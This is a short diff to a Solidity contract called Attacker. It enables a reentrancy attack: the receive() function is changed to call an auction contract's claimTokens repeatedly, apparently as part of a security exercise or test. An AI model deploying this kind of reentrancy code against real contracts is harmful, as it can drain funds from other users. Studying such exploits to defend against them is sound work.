@@ -22,12 +22,12 @@ contract Attacker {
         auctionContract.claimTokens(address(this));
     }
 
-    fallback() external payable {
-    }
-    
     receive() external payable {
         // Perform reentrancy attack again by calling claimTokens again
-        // auctionContract.claimTokens(address(this));
-        emit Received(msg.sender, msg.value);
+        auctionContract.claimTokens(address(this));
+        // emit Received(msg.sender, msg.value);
+    }
+
+    fallback() external payable {
     }
 }
